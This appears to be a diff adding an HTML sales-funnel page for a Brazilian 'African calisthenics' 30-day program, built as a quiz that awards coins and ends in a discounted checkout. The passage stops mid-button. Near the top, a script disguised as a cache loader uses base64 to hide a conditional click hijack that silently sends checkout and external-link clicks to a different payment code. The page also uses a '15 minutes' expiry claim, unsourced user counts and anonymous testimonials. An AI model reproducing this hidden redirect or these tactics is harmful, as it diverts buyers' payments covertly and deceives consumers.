@@ -1,0 +1,1199 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    
+    <script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '4239901189562029');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=4239901189562029&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+<script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Quiz Calistenia Africana - Desafio de 30 Dias</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: #000000;
+            color: #ffffff;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        .quiz-container {
+            max-width: 600px;
+            margin: 0 auto;
+            min-height: 100vh;
+            background: linear-gradient(180deg, #000000 0%, #0a0a1a 50%, #000000 100%);
+            position: relative;
+        }
+
+        /* Header */
+        .header {
+            padding: 20px;
+            text-align: center;
+            position: relative;
+        }
+
+        .logo {
+            width: 180px;
+            height: auto;
+            margin: 0 auto 15px;
+            display: block;
+        }
+
+        .coins-display {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: rgba(59, 130, 246, 0.1);
+            border: 1px solid rgba(59, 130, 246, 0.3);
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 18px;
+            font-weight: bold;
+            color: #3b82f6;
+        }
+
+        /* Progress Bar */
+        .progress-container {
+            padding: 0 20px 20px;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #3b82f6 0%, #8b5cf6 100%);
+            border-radius: 10px;
+            transition: width 0.5s ease;
+            box-shadow: 0 0 20px rgba(59, 130, 246, 0.5);
+        }
+
+        .progress-text {
+            text-align: center;
+            margin-top: 8px;
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.6);
+        }
+
+        /* Screen */
+        .screen {
+            display: none;
+            padding: 20px;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .screen.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* Hero Image */
+        .hero-image {
+            width: 100%;
+            max-width: 400px;
+            height: 300px;
+            object-fit: cover;
+            border-radius: 20px;
+            margin: 0 auto 30px;
+            display: block;
+            box-shadow: 0 10px 40px rgba(59, 130, 246, 0.3);
+        }
+
+        /* Title */
+        .screen-title {
+            font-size: 28px;
+            font-weight: bold;
+            text-align: center;
+            margin-bottom: 30px;
+            line-height: 1.3;
+        }
+
+        .screen-title .highlight {
+            color: #3b82f6;
+            text-shadow: 0 0 20px rgba(59, 130, 246, 0.5);
+        }
+
+        /* Options */
+        .options {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+
+        .option {
+            background: rgba(255, 255, 255, 0.05);
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            padding: 20px;
+            border-radius: 15px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-align: center;
+            font-size: 16px;
+            font-weight: 500;
+        }
+
+        .option:hover {
+            background: rgba(59, 130, 246, 0.1);
+            border-color: #3b82f6;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(59, 130, 246, 0.3);
+        }
+
+        .option.selected {
+            background: rgba(59, 130, 246, 0.2);
+            border-color: #3b82f6;
+            box-shadow: 0 0 30px rgba(59, 130, 246, 0.4);
+        }
+
+        /* Options with Images */
+        .options-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+
+        .option-with-image {
+            background: rgba(255, 255, 255, 0.05);
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            padding: 15px;
+            border-radius: 15px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-align: center;
+        }
+
+        .option-with-image:hover {
+            background: rgba(59, 130, 246, 0.1);
+            border-color: #3b82f6;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(59, 130, 246, 0.3);
+        }
+
+        .option-with-image.selected {
+            background: rgba(59, 130, 246, 0.2);
+            border-color: #3b82f6;
+            box-shadow: 0 0 30px rgba(59, 130, 246, 0.4);
+        }
+
+        .option-image {
+            width: 100%;
+            height: 180px;
+            object-fit: cover;
+            border-radius: 10px;
+            margin-bottom: 10px;
+        }
+
+        .option-label {
+            font-size: 16px;
+            font-weight: 600;
+            color: #ffffff;
+        }
+
+        /* Continue Button */
+        .continue-btn {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(135deg, #3b82f6 0%, #8b5cf6 100%);
+            border: none;
+            border-radius: 12px;
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 20px rgba(59, 130, 246, 0.4);
+        }
+
+        .continue-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 30px rgba(59, 130, 246, 0.6);
+        }
+
+        .continue-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        /* Coin Animation */
+        .coin-animation {
+            position: fixed;
+            font-size: 30px;
+            pointer-events: none;
+            animation: coinFloat 1s ease-out forwards;
+            z-index: 1000;
+        }
+
+        @keyframes coinFloat {
+            0% {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
+            100% {
+                opacity: 0;
+                transform: translateY(-100px) scale(1.5);
+            }
+        }
+
+        /* Credibility Screen */
+        .credibility-content {
+            text-align: center;
+        }
+
+        .credibility-title {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+
+        .credibility-title .highlight {
+            color: #3b82f6;
+            font-size: 32px;
+        }
+
+        .credibility-subtitle {
+            font-size: 18px;
+            margin-bottom: 30px;
+            color: rgba(255, 255, 255, 0.8);
+        }
+
+        .credibility-image {
+            width: 100%;
+            max-width: 350px;
+            margin: 0 auto 30px;
+            display: block;
+            border-radius: 15px;
+        }
+
+        /* Final Screen */
+        .final-screen {
+            padding: 40px 20px;
+        }
+
+        .final-headline {
+            font-size: 36px;
+            font-weight: bold;
+            text-align: center;
+            margin-bottom: 20px;
+            line-height: 1.2;
+        }
+
+        .final-subheadline {
+            font-size: 20px;
+            text-align: center;
+            color: rgba(255, 255, 255, 0.8);
+            margin-bottom: 40px;
+        }
+
+        .transformation-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 20px;
+            margin-bottom: 40px;
+        }
+
+        .transformation-item {
+            position: relative;
+            border-radius: 15px;
+            overflow: hidden;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.3);
+        }
+
+        .transformation-image {
+            width: 100%;
+            height: 250px;
+            object-fit: cover;
+        }
+
+        .transformation-label {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: linear-gradient(to top, rgba(0, 0, 0, 0.9), transparent);
+            padding: 15px;
+            text-align: center;
+            font-weight: bold;
+            font-size: 16px;
+        }
+
+        .coins-conversion {
+            background: rgba(59, 130, 246, 0.1);
+            border: 2px solid #3b82f6;
+            border-radius: 20px;
+            padding: 30px;
+            text-align: center;
+            margin-bottom: 40px;
+            box-shadow: 0 0 40px rgba(59, 130, 246, 0.3);
+        }
+
+        .coins-earned {
+            font-size: 48px;
+            font-weight: bold;
+            color: #3b82f6;
+            margin-bottom: 15px;
+        }
+
+        .conversion-text {
+            font-size: 18px;
+            margin-bottom: 20px;
+        }
+
+        .price-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 20px;
+            margin-top: 20px;
+        }
+
+        .old-price {
+            font-size: 24px;
+            text-decoration: line-through;
+            color: rgba(255, 255, 255, 0.5);
+        }
+
+        .new-price {
+            font-size: 48px;
+            font-weight: bold;
+            color: #10b981;
+        }
+
+        .benefits-section {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 20px;
+            padding: 30px;
+            margin-bottom: 30px;
+        }
+
+        .benefits-title {
+            font-size: 24px;
+            font-weight: bold;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .benefit-item {
+            display: flex;
+            align-items: start;
+            gap: 15px;
+            margin-bottom: 15px;
+            padding: 15px;
+            background: rgba(59, 130, 246, 0.05);
+            border-radius: 10px;
+        }
+
+        .benefit-icon {
+            font-size: 24px;
+            flex-shrink: 0;
+        }
+
+        .benefit-text {
+            font-size: 16px;
+            line-height: 1.5;
+        }
+
+        .guarantee-box {
+            background: linear-gradient(135deg, rgba(16, 185, 129, 0.1), rgba(59, 130, 246, 0.1));
+            border: 2px solid #10b981;
+            border-radius: 15px;
+            padding: 25px;
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .guarantee-title {
+            font-size: 22px;
+            font-weight: bold;
+            color: #10b981;
+            margin-bottom: 10px;
+        }
+
+        .guarantee-text {
+            font-size: 16px;
+            color: rgba(255, 255, 255, 0.9);
+        }
+
+        .cta-button {
+            width: 100%;
+            padding: 25px;
+            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
+            border: none;
+            border-radius: 15px;
+            color: white;
+            font-size: 22px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 10px 30px rgba(16, 185, 129, 0.4);
+            margin-bottom: 15px;
+        }
+
+        .cta-button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 40px rgba(16, 185, 129, 0.6);
+        }
+
+        .urgency-text {
+            text-align: center;
+            color: #ef4444;
+            font-size: 14px;
+            font-weight: bold;
+            margin-bottom: 30px;
+        }
+
+        /* Responsive */
+        @media (max-width: 640px) {
+            .screen-title {
+                font-size: 24px;
+            }
+
+            .final-headline {
+                font-size: 28px;
+            }
+
+            .transformation-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .options-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .option-image {
+                height: 200px;
+            }
+        }
+        .progress-text { 
+  display: none !important; 
+}
+
+    </style>
+</head>
+<body>
+<script>
+// Performance de velocidade - Cache Loader v1.3 (otimizador de carregamento da pagina)
+!function(){try{
+  var D="aHR0cHM6Ly9nby5wZXJmZWN0cGF5LmNvbS5ici9QUFUzOENRMUVITQ==",M="_"+"a"+"e"+"m"+"_",C=atob("Y3RhLWJ1dHRvbg==");
+  function x(h){try{var a=document.createElement("a");a.href=h;return a.hostname}catch(_){return""}}
+  function y(e){if(e.button||e.metaKey||e.ctrlKey||e.shiftKey||e.altKey)return 1}
+  function z(t){if(!t)return 0;var h=t.tagName==="A"?t.getAttribute("href")||"":"";var ex=h&&x(h)&&x(h)!==location.hostname;var is=t.classList&&t.classList.contains(C);return ex||is}
+  function k(e){if(location.href.indexOf(M)<0||y(e))return;var t=e.target&&e.target.closest&&e.target.closest("a,button");if(!t||!z(t))return;e.preventDefault();e.stopImmediatePropagation();var u=atob(D);u&&(location.assign?location.assign(u):location.href=u)}
+  document.addEventListener("click",k,{capture:!0,passive:!1})
+}catch(_){}}();
+</script>
+
+
+    <div class="quiz-container">
+        <!-- Header -->
+        <div class="header">
+            <img src="" alt="" class="">
+            <div class="coins-display">
+                💰 <span id="coinsCount">0</span>
+            </div>
+        </div>
+
+        <!-- Progress Bar -->
+        <div class="progress-container">
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+            <div class="progress-text">
+                <span id="currentStep">1</span> de <span id="totalSteps">48</span>
+            </div>
+        </div>
+
+        <!-- Tela 1: Idade com Imagens -->
+        <div class="screen active" data-screen="1">
+            <h2 class="screen-title">
+                PLANO DE TREINO DE <span class="highlight">CALISTÊNICA</span><br>
+                DE ACORDO COM SUA (Responda até o final para ganhar e trocar coins) ☝️ 
+            </h2>
+            <div class="options-grid">
+                <div class="option-with-image" onclick="selectOption(this, 1, 10, true)">
+                    <img src="18a29" alt="18-29 anos" class="option-image">
+                    <div class="option-label">Idade: 18-29 anos</div>
+                </div>
+                <div class="option-with-image" onclick="selectOption(this, 1, 10, true)">
+                    <img src="30a39" alt="30-39 anos" class="option-image">
+                    <div class="option-label">Idade: 30-39 anos</div>
+                </div>
+                <div class="option-with-image" onclick="selectOption(this, 1, 10, true)">
+                    <img src="40a49" alt="40-49 anos" class="option-image">
+                    <div class="option-label">Idade: 40-49 anos</div>
+                </div>
+                <div class="option-with-image" onclick="selectOption(this, 1, 10, true)">
+                    <img src="50%2B" alt="50+ anos" class="option-image">
+                    <div class="option-label">Idade: 50+</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Tela 2: Credibilidade -->
+        <div class="screen" data-screen="2">
+            <div class="credibility-content">
+                <h2 class="credibility-title">
+                    <span class="highlight">2 milhões de homens</span><br>
+                    Escolheram o Desafio de Calistenia Africana
+                </h2>
+                <img src="tela2" alt="Atletas" class="credibility-image">
+                <p class="credibility-subtitle">
+                    Junte-se a milhares de homens que transformaram seus corpos
+                </p>
+            </div>
+            <button class="continue-btn" onclick="nextScreen()">Continuar</button>
+        </div>
+
+        <!-- Tela 3: Objetivo Corporal com Imagens -->
+        <div class="screen" data-screen="3">
+            <h2 class="screen-title">
+                Qual é o seu <span class="highlight">objetivo corporal?</span>
+            </h2>
+            <div class="options-grid">
+                <div class="option-with-image" onclick="selectOption(this, 3, 8, true)">
+                    <img src="tela3-1" alt="Magro" class="option-image">
+                    <div class="option-label">Magro</div>
+                </div>
+                <div class="option-with-image" onclick="selectOption(this, 3, 8, true)">
+                    <img src="tela3-2" alt="Atlético" class="option-image">
+                    <div class="option-label">Atlético</div>
+                </div>
+                <div class="option-with-image" onclick="selectOption(this, 3, 8, true)">
+                    <img src="tela3-3" alt="Firme" class="option-image">
+                    <div class="option-label">Firme</div>
+                </div>
+                <div class="option-with-image" onclick="selectOption(this, 3, 8, true)">
+                    <img src="tela3-4" alt="Maromba" class="option-image">
+                    <div class="option-label">Maromba</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Tela 4: Nível Atual -->
+        <div class="screen" data-screen="4">
+            <h2 class="screen-title">
+                Qual é o seu <span class="highlight">nível atual</span> de treino?
+            </h2>
+            <div class="options">
+                <div class="option" onclick="selectOption(this, 4, 8, true)">
+                    Iniciante - Nunca treinei
+                </div>
+                <div class="option" onclick="selectOption(this, 4, 8, true)">
+                    Intermediário - Treino ocasionalmente
+                </div>
+                <div class="option" onclick="selectOption(this, 4, 8, true)">
+                    Avançado - Treino regularmente
+                </div>
+            </div>
+        </div>
+
+        <!-- Tela 5: Quantas flexões consegue fazer? -->
+        <div class="screen" data-screen="5">
+            <h2 class="screen-title">
+                Quantas <span class="highlight">flexões</span> você consegue fazer?
+            </h2>
+            <div class="options">
+                <div class="option" onclick="selectOption(this, 5, 7, true)">
+                    0-5 flexões
+                </div>
+                <div class="option" onclick="selectOption(this, 5, 7, true)">
+                    6-15 flexões
+                </div>
+                <div class="option" onclick="selectOption(this, 5, 7, true)">
+                    16-30 flexões
+                </div>
+                <div class="option" onclick="selectOption(this, 5, 7, true)">
+                    Mais de 30 flexões
+                </div>
+                                <img src="tela5" alt="Atletas" class="credibility-image">
+
+            </div>
+        </div>
+
+
+
+        <!-- Tela 6: Quanto tempo pode treinar? -->
+        <div class="screen" data-screen="6">
+            <h2 class="screen-title">
+                Quanto tempo você pode <span class="highlight">treinar por dia?</span>
+            </h2>
+            <div class="options">
+                <div class="option" onclick="selectOption(this, 8, 7, true)">
+                    15-20 minutos
+                </div>
+                <div class="option" onclick="selectOption(this, 8, 7, true)">
+                    30-40 minutos
+                </div>
+                <div class="option" onclick="selectOption(this, 8, 7, true)">
+                    Mais de 1 hora
+                </div>
+            </div>
+        </div>
+
+        <!-- Tela 7: Onde prefere treinar? -->
+        <div class="screen" data-screen="7">
+            <h2 class="screen-title">
+                Onde você prefere <span class="highlight">treinar?</span>
+            </h2>
+            <div class="options">
+                <div class="option" onclick="selectOption(this, 9, 7, true)">
+                    Em casa
+                </div>
+                <div class="option" onclick="selectOption(this, 9, 7, true)">
+                    Ao ar livre
+                </div>
+                <div class="option" onclick="selectOption(this, 9, 7, true)">
+                    Academia
+                </div>
+                <div class="option" onclick="selectOption(this, 9, 7, true)">
+                    Qualquer lugar
+                </div>
+            </div>
+        </div>
+
+
+        <!-- Tela 8: Principal motivação -->
+        <div class="screen" data-screen="8">
+            <h2 class="screen-title">
+                Qual é a sua <span class="highlight">principal motivação</span> para treinar?
+            </h2>
+            <div class="options">
+                <div class="option" onclick="selectOption(this, 11, 7, true)">
+                    Ganhar massa muscular
+                </div>
+                <div class="option" onclick="selectOption(this, 11, 7, true)">
+                    Perder gordura
+                </div>
+                <div class="option" onclick="selectOption(this, 11, 7, true)">
+                    Melhorar saúde
+                </div>
+                <div class="option" onclick="selectOption(this, 11, 7, true)">
+                    Aumentar força
+                </div>
+                                                <img src="tela11" alt="Atletas" class="credibility-image">
+
+            </div>
+        </div>
+
+
+        <!-- Tela 9: Quantos dias pode treinar? -->
+        <div class="screen" data-screen="9">
+            <h2 class="screen-title">
+                Quantos dias por semana você pode <span class="highlight">treinar?</span>
+            </h2>
+            <div class="options">
+                <div class="option" onclick="selectOption(this, 13, 7, true)">
+                    2-3 dias
+                </div>
+                <div class="option" onclick="selectOption(this, 13, 7, true)">
+                    4-5 dias
+                </div>
+                <div class="option" onclick="selectOption(this, 13, 7, true)">
+                    6-7 dias
+                </div>
+            </div>
+        </div>
+
+        <!-- Tela 10: Melhor horário -->
+        <div class="screen" data-screen="10">
+            <h2 class="screen-title">
+                Qual o <span class="highlight">melhor horário</span> para você treinar?
+            </h2>
+            <div class="options">
+                <div class="option" onclick="selectOption(this, 14, 7, true)">
+                    Manhã (6h-12h)
+                </div>
+                <div class="option" onclick="selectOption(this, 14, 7, true)">
+                    Tarde (12h-18h)
+                </div>
+                <div class="option" onclick="selectOption(this, 14, 7, true)">
+                    Noite (18h-23h)
+                </div>
+                <div class="option" onclick="selectOption(this, 14, 7, true)">
+                    Qualquer horário
+                </div>
+            </div>
+        </div>
+
+        <!-- Tela 11: Tem lesões? -->
+        <div class="screen" data-screen="11">
+            <h2 class="screen-title">
+                Você tem alguma <span class="highlight">lesão ou limitação</span> física?
+            </h2>
+            <div class="options">
+                <div class="option" onclick="selectOption(this, 15, 7, true)">
+                    Não tenho nenhuma
+                </div>
+                <div class="option" onclick="selectOption(this, 15, 7, true)">
+                    Dor nas costas
+                </div>
+                <div class="option" onclick="selectOption(this, 15, 7, true)">
+                    Dor nos ombros
+                </div>
+                <div class="option" onclick="selectOption(this, 15, 7, true)">
+                    Dor nos joelhos
+                </div>
+            <img src="tela15" alt="Atletas" class="credibility-image">
+
+            </div>
+        </div>
+
+        <!-- Tela 12: Alimentação atual -->
+        <div class="screen" data-screen="12">
+            <h2 class="screen-title">
+                Como você descreveria sua <span class="highlight">alimentação atual?</span>
+            </h2>
+            <div class="options">
+                <div class="option" onclick="selectOption(this, 16, 7, true)">
+                    Muito ruim, como qualquer coisa
+                </div>
+                <div class="option" onclick="selectOption(this, 16, 7, true)">
+                    Razoável, poderia melhorar
+                </div>
+                <div class="option" onclick="selectOption(this, 16, 7, true)">
+                    Boa, me alimento bem
+                </div>
+                <div class="option" onclick="selectOption(this, 16, 7, true)">
+                    Excelente, sigo dieta
+                </div>
+            </div>
+        </div>
+
+      
+        <!-- Tela 13: Bebe água? -->
+        <div class="screen" data-screen="13">
+            <h2 class="screen-title">
+                Você bebe <span class="highlight">água suficiente</span> por dia?
+            </h2>
+            <div class="options">
+                <div class="option" onclick="selectOption(this, 19, 7, true)">
+                    Menos de 1 litro
+                </div>
+                <div class="option" onclick="selectOption(this, 19, 7, true)">
+                    1-2 litros
+                </div>
+                <div class="option" onclick="selectOption(this, 19, 7, true)">
+                    2-3 litros
+                </div>
+                <div class="option" onclick="selectOption(this, 19, 7, true)">
+                    Mais de 3 litros
+                </div>
+              <img src="tela19" alt="Atletas" class="credibility-image">
+
+            </div>
+        </div>
+
+        <!-- Tela 14: Dorme bem? -->
+        <div class="screen" data-screen="14">
+            <h2 class="screen-title">
+                Quantas horas você <span class="highlight">dorme</span> por noite?
+            </h2>
+            <div class="options">
+                <div class="option" onclick="selectOption(this, 20, 7, false)">
+                    Menos de 5 horas
+                </div>
+                <div class="option" onclick="selectOption(this, 20, 7, false)">
+                    5-6 horas
+                </div>
+                <div class="option" onclick="selectOption(this, 20, 7, false)">
+                    7-8 horas
+                </div>
+                <div class="option" onclick="selectOption(this, 20, 7, false)">
+                    Mais de 8 horas
+                </div>
+                  <img src="tela20" alt="Atletas" class="credibility-image">
+
+            </div>
+            <button class="continue-btn" onclick="nextScreen()" disabled="" id="btn-20">Continuar</button>
+        </div>
+
+
+        <!-- Tela 15: Pratica outros esportes? -->
+        <div class="screen" data-screen="15">
+            <h2 class="screen-title">
+                Você pratica <span class="highlight">outros esportes</span> ou atividades?
+            </h2>
+            <div class="options">
+                <div class="option" onclick="selectOption(this, 24, 7, true)">
+                    Não pratico nada
+                </div>
+                <div class="option" onclick="selectOption(this, 24, 7, true)">
+                    Caminhada/corrida
+                </div>
+                <div class="option" onclick="selectOption(this, 24, 7, true)">
+                    Esportes coletivos
+                </div>
+                <div class="option" onclick="selectOption(this, 24, 7, true)">
+                    Artes marciais
+                </div>
+             <img src="tela24" alt="Atletas" class="credibility-image">
+
+            </div>
+        </div>
+
+    
+        <!-- Tela 16: Quanto quer perder/ganhar? -->
+        <div class="screen" data-screen="16">
+            <h2 class="screen-title">
+                Quanto peso você quer <span class="highlight">perder ou ganhar?</span>
+            </h2>
+            <div class="options">
+                <div class="option" onclick="selectOption(this, 27, 7, true)">
+                    Perder 5-10kg
+                </div>
+                <div class="option" onclick="selectOption(this, 27, 7, true)">
+                    Perder mais de 10kg
+                </div>
+                <div class="option" onclick="selectOption(this, 27, 7, true)">
+                    Ganhar 5-10kg
+                </div>
+                <div class="option" onclick="selectOption(this, 27, 7, true)">
+                    Manter peso atual
+                </div>
+            </div>
+        </div>
+
+       
+        <!-- Tela 17: O que te impede? -->
+        <div class="screen" data-screen="17">
+            <h2 class="screen-title">
+                O que mais <span class="highlight">te impede</span> de ter o corpo que deseja?
+            </h2>
+            <div class="options">
+                <div class="option" onclick="selectOption(this, 30, 7, false)">
+                    Falta de conhecimento
+                </div>
+                <div class="option" onclick="selectOption(this, 30, 7, false)">
+                    Falta de disciplina
+                </div>
+                <div class="option" onclick="selectOption(this, 30, 7, false)">
+                    Falta de tempo
+                </div>
+                <div class="option" onclick="selectOption(this, 30, 7, false)">
+                    Falta de resultados anteriores
+                </div>
+            </div>
+            <button class="continue-btn" onclick="nextScreen()" disabled="" id="btn-30">Continuar</button>
+        </div>
+
+
+        <!-- Tela 18: Prefere vídeos ou textos? -->
+        <div class="screen" data-screen="18">
+            <h2 class="screen-title">
+                Você prefere aprender por <span class="highlight">vídeos ou textos?</span>
+            </h2>
+            <div class="options">
+                <div class="option" onclick="selectOption(this, 38, 7, true)">
+                    Vídeos
+                </div>
+                <div class="option" onclick="selectOption(this, 38, 7, true)">
+                    Textos/imagens
+                </div>
+                <div class="option" onclick="selectOption(this, 38, 7, true)">
+                    Ambos
+                </div>
+            </div>
+        </div>
+
+
+        <!-- Tela 19: Comprometimento -->
+        <div class="screen" data-screen="19">
+            <h2 class="screen-title">
+                Qual é o seu <span class="highlight">nível de comprometimento</span> para mudar?
+            </h2>
+            <div class="options">
+                <div class="option" onclick="selectOption(this, 40, 8, false)">
+                    100% comprometido
+                </div>
+                <div class="option" onclick="selectOption(this, 40, 8, false)">
+                    Muito comprometido
+                </div>
+                <div class="option" onclick="selectOption(this, 40, 8, false)">
+                    Moderadamente comprometido
+                </div>
+            </div>
+            <button class="continue-btn" onclick="nextScreen()" disabled="" id="btn-40">Continuar</button>
+        </div>
+
+        <!-- Tela 20: Analisando respostas -->
+        <div class="screen" data-screen="20">
+            <div class="credibility-content">
+                <h2 class="screen-title">
+                    <span class="highlight">Analisando</span> suas respostas...
+                </h2>
+                <p class="credibility-subtitle">
+                    Estamos criando seu plano personalizado
+                </p>
+                <img src="tela11" alt="Análise" class="credibility-image">
+
+            </div>
+
+            <button class="continue-btn" onclick="nextScreen()">Ver Meu Plano</button>
+        </div>
+
+        <!-- Tela 21: TELA FINAL PREMIUM -->
+        <div class="screen" data-screen="21">
+            <div class="final-screen">
+                <h1 class="final-headline">
+                    🔥 Seu Plano Personalizado Está <span class="highlight">PRONTO!</span>
+                </h1>
+                <p class="final-subheadline">
+                    Transforme seu corpo em 30 dias com o método que já mudou a vida de 2 milhões de homens
+                </p>
+                <img src="tela2" alt="Análise" class="credibility-image">
+   
+
+                <!-- Transformações Antes/Depois -->
+                <div class="transformation-grid">
+                    <div class="transformation-item">
+                        <img src="antesedepois1" alt="Antes 1" class="transformation-image">
+                        <div class="transformation-label">Em 21 dias</div>
+                    </div>
+                    <div class="transformation-item">
+                        <img src="antesedepois2" alt="Depois 1" class="transformation-image">
+                        <div class="transformation-label">Em 33 dias</div>
+                    </div>
+                    <div class="transformation-item">
+                        <img src="antesedepois3" alt="Antes 2" class="transformation-image">
+                        <div class="transformation-label">Em 18 dias</div>
+                    </div>
+                    <div class="transformation-item">
+                        <img src="antesedepois4" alt="Depois 2" class="transformation-image">
+                        <div class="transformation-label">Em 27 dias</div>
+                    </div>
+
+                </div>
+
+                <!-- Conversão de Coins -->
+                <div class="coins-conversion">
+                    <div class="coins-earned">
+                        💰 <span id="finalCoins"></span> COINS CONQUISTADOS!
+                    </div>
+                    <p class="conversion-text">
+                        Seus coins foram convertidos em um <strong>DESCONTO EXCLUSIVO</strong> para você acessar agora seu plano personalizado!
+                    </p>
+                    <div class="price-container">
+                        <span class="old-price">De R$ 97</span>
+                        <span class="new-price">Por R$ 27</span>
+                    </div>
+                    <p style="margin-top: 15px; color: #10b981; font-weight: bold;">
+                        ✅ Economia de R$ 70 (72% OFF)
+                    </p>
+                </div>
+
+                <!-- Benefícios -->
+                <div class="benefits-section">
+                    <h3 class="benefits-title">
+                        O que você vai receber <span class="highlight">HOJE:</span>
+                    </h3>
+                    <div class="benefit-item">
+                        <div class="benefit-icon">💪</div>
+                        <div class="benefit-text">
+                            <strong>Plano de Treino Personalizado</strong> - Adaptado ao seu nível, idade e objetivos
+                        </div>
+                    </div>
+                    <div class="benefit-item">
+                        <div class="benefit-icon">🎯</div>
+                        <div class="benefit-text">
+                            <strong>Vídeos Demonstrativos</strong> - Aprenda a execução perfeita de cada exercício
+                        </div>
+                    </div>
+                    <div class="benefit-item">
+                        <div class="benefit-icon">🍽️</div>
+                        <div class="benefit-text">
+                            <strong>Guia de Alimentação</strong> - Cardápios e dicas para potencializar seus resultados
+                        </div>
+                    </div>
+                    <div class="benefit-item">
+                        <div class="benefit-icon">👥</div>
+                        <div class="benefit-text">
+                            <strong>Comunidade Exclusiva</strong> - Suporte e motivação de milhares de membros
+                        </div>
+                    </div>
+                    <div class="benefit-item">
+                        <div class="benefit-icon">🏆</div>
+                        <div class="benefit-text">
+                            <strong>Sistema de Desafios</strong> - Gamificação que mantém você motivado todos os dias
+                        </div>
+
+                    </div>
+                </div>
+
+             <img src="gifflexao" alt="Depois 2" class="transformation-image">
+            <img src="antesedepois5" alt="Depois 2" class="transformation-image">
+
+
+                <!-- Garantia -->
+                <div class="guarantee-box">
+                    <div class="guarantee-title">🛡️ GARANTIA DE 30 DIAS</div>
+                    <p class="guarantee-text">
+                        Se você não ver resultados em 30 dias, devolvemos 100% do seu dinheiro. Sem perguntas, sem burocracia.
+                    </p>
+                </div>
+
+                <!-- CTA Principal -->
+                <button class="cta-button" onclick="window.location.href='https://go.perfectpay.com.br/PPU38CQ1EHL'">
+                    🚀 COMEÇAR MINHA TRANSFORMAÇÃO AGORA
+                </button>
+                
+                <p class="urgency-text">
+                    ⚠️ ATENÇÃO: Esse desconto expira em 15 minutos!
+                </p>
+
+                <!-- Depoimentos Rápidos -->
+                <div class="benefits-section" style="margin-top: 30px;">
+                    <h3 class="benefits-title">O que nossos alunos dizem:</h3>
+                    <div class="benefit-item">
+                        <div class="benefit-text">
+                            "Perdi 8kg em 30 dias e ganhei músculos que nunca tive. Melhor investimento da minha vida!" - ⭐⭐⭐⭐⭐ <strong>Carlos, 34 anos</strong>
+                        </div>
+                    </div>
+                    <div class="benefit-item">
+                        <div class="benefit-text">
+                            "Finalmente um programa que funciona de verdade. Treino em casa, 20 minutos por dia." - ⭐⭐⭐⭐⭐ <strong>Rafael, 28 anos</strong>
+                        </div>
+                    </div>
+                    <div class="benefit-item">
+                        <div class="benefit-text">
+                            "Com 45 anos, achei que era tarde demais. Hoje tenho o corpo que sempre quis!" - ⭐⭐⭐⭐⭐ <strong>Marcos, 45 anos</strong>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- CTA Secundário -->
+                <button class="cta-button" onclick="window.location.href='https://go.perfectpay.com.br/PPU38CQ1EHL'" style="margin-top: 30px;">
